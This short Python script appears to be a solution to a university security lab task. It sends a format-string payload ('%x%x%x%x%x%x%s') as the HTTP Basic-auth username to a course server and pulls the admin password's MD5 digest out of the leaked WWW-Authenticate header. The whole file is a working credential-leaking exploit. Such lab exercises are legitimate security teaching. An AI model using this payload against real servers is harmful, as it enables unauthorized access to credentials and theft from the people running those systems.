print('TASK 1')
print('-------------------------------')


import requests

# Configuration
url = "http://project-2.csec.chatzi.org:8000"
username = "%x%x%x%x%x%x%s"
password = ""

# Creating the session for the request
session = requests.Session()
session.auth = (username, password)

# Sending the request
response = session.get(url)

# Print the MD5 digest of plaintext password
for header, value in response.headers.items():
    if header == "WWW-Authenticate" and len(value.split("admin:")) > 1:
        print("The MD5 digest of plaintext password for admin is: " + value.split("admin:")[1].split('"')[0])


print('-------------------------------')
